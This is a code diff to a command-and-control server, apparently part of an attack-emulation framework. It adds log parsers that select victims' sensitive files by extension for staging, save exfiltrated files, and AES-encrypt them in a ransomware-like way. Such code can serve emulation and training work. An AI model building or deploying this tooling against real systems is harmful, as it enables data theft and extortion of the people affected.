@@ -1,4 +1,7 @@
 import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+import hashlib
 from c2.c2_server import read_c2_log, ConnectionStorage
 from c2.c2_facts import FactsStorage
 import c2.makeminidump
@@ -47,6 +50,20 @@ def generic_dir_parser(conn_uuid, cmd_indexes_list):
                 ('target_file', target[0])]
 
 
+def sensitive_files_dir_parser(conn_uuid, cmd_indexes_list):
+    sensitive_files = []
+    sensitive_extensions = (".doc", ".docx", ".pdf", ".jpg", ".jpeg", ".png", ".mp4", ".txt", ".pptx", ".zip", ".7z")
+    for index in cmd_indexes_list:
+        data = read_c2_log(conn_uuid, index).split('\n')
+        base_dir = data[0].split(" ")[1].strip()
+        data = data[1:]
+        for line in data:
+            line = line.replace('\x00', '')
+            if line.lower().endswith(sensitive_extensions):
+                sensitive_files.append(base_dir + line)
+    return [('staged_files', sensitive_files)]
+
+
 def generic_file_parser(conn_uuid, cmd_indexes_list):
     exfiltrated_files = []
     for index in cmd_indexes_list:
@@ -58,6 +75,30 @@ def generic_file_parser(conn_uuid, cmd_indexes_list):
         exfiltrated_files.append(exfil_filename)
         with open(os.path.join('/usr/src/app/c2/connections', conn_uuid, exfil_filename), 'wb') as f:
             f.write(file_data)
+    return [('exfiltrated_files', exfiltrated_files)]
+
+
+def file_parsing_and_encryption(conn_uuid, cmd_indexes_list):
+    exfiltrated_files = []
+    for index in cmd_indexes_list:
+        data = read_c2_log(conn_uuid, index, decode=False).split(b'\n')
+        cmd, file_data = data[0], b"\n".join(data[1:])
+        cmd = cmd.decode()
+        full_path = cmd.split(" ")[1]
+        exfil_filename = full_path.replace("\\", "_")
+        exfiltrated_files.append(exfil_filename)
+        with open(os.path.join('/usr/src/app/c2/connections', conn_uuid, exfil_filename), 'wb') as f:
+            f.write(file_data)
+        exfil_filename_enc = exfil_filename + '.enc'
+        md5 = hashlib.md5()
+        md5.update(conn_uuid.encode())
+        md5.update(exfil_filename_enc.encode())
+        aes_key = md5.digest()
+        cipher = AES.new(aes_key, AES.MODE_CBC)
+        enc_file_data = cipher.encrypt(pad(file_data, AES.block_size))
+        enc_file_data = cipher.iv + enc_file_data
+        with open(os.path.join('/usr/src/app/c2/connections', conn_uuid, exfil_filename_enc), 'wb') as f:
+            f.write(enc_file_data)
     return [('exfiltrated_files', exfiltrated_files)]
 
 
